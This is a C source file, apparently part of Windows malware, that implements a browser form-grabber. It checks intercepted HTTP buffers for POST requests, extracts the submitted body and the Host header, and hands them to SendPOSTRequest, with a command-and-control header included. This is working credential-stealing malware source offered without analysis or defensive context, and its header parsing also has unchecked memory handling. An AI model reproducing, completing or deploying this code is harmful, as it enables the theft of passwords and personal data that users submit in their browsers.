#include <Windows.h>
#include <WinInet.h>
#include <shlwapi.h>
#include "C Runtime.h"
#include "HTTP Parse.h"
#include "CommandControl.h"

DWORD ProcessHeader(char* Buffer, DWORD Amount, const char*Browser,char*HostDest,DWORD HostSize,char* szFunction)
{
	char* Temp = 0;
	char* Content = 0;
	char ContentHost[MAX_PATH];
	DWORD nContent = 0;

	RtlSecureZeroMemory(ContentHost, MAX_PATH);

	if (!isPostData(Buffer))
	{
		return 0;
	}

	Temp = (char*)HeapAlloc(GetProcessHeap(),0,Amount+1);
	if (!Temp)
	{
		return 0;
	}

	RtlSecureZeroMemory(Temp,Amount+1);
	m_memcpy(Temp,Buffer,Amount);

	if (ParseContent(Temp,0))
	{
		Content = StrStrIA(Temp, "\r\n\r\n");
		if (Content)
		{
			Content+=4;
			if (ParseHeader(Temp, "Host: ", ContentHost, sizeof(ContentHost)))
			{
				SendPOSTRequest((char*)Browser,ContentHost,strlen(ContentHost),szFunction,strlen(szFunction),Content,strlen(Content));
			}
		}
	}
	else if (HostDest && HostSize)
	{

		if (ParseHeader(Temp,"Host: ",HostDest, HostSize))
		{
			nContent = -1;
		}

	}
	HeapFree(GetProcessHeap(),0,Temp);
	return nContent;
}

DWORD ParseContent(const void* buf, char* Destination)
{
	char* ToEnd = 0;
	DWORD Amount = 0;
	ToEnd = StrStrIA((char*)buf, "\r\n\r\n");
	if (ToEnd)
	{
		ToEnd+=4;
		Amount = strlen(ToEnd);
		if (Amount)
		{
			if (Destination)
			{
				m_memcpy(Destination, ToEnd, Amount);
			}
		}
	}
	return Amount;
}

BOOL ParseHeader(const void *buf, char* Header, char*Dst, DWORD nbuf)
{

	if (buf && Header && Dst && nbuf > 0)
	{
		DWORD len = 0;
		char* beg = 0;
		char* ToEnd = StrStrIA((char*)buf, Header);

		if (ToEnd)
		{

			while(*ToEnd++ != ' ');
			beg = ToEnd;
			while(*ToEnd++!='\r');
			*ToEnd = 0;

			len = strlen(beg);

			if (len > nbuf)
				len = nbuf;

			m_memcpy(Dst, beg, len);
			Dst[len-1] = 0;

			return TRUE;
		}
	}
	return FALSE;
}


BOOL isPostData(char* Buffer)
{
	if (!StrCmpNA(Buffer, "POST", strlen("POST")))   //check if post header
	{
		/*if (!StrStrIA(Buffer, "content-length"))  //meh used for determining what content type or length in the post boundary
		return FALSE;

		if (!StrStrIA(Buffer, "Host: "))              
		return FALSE;*/

		return TRUE;
	}
	return FALSE;
}

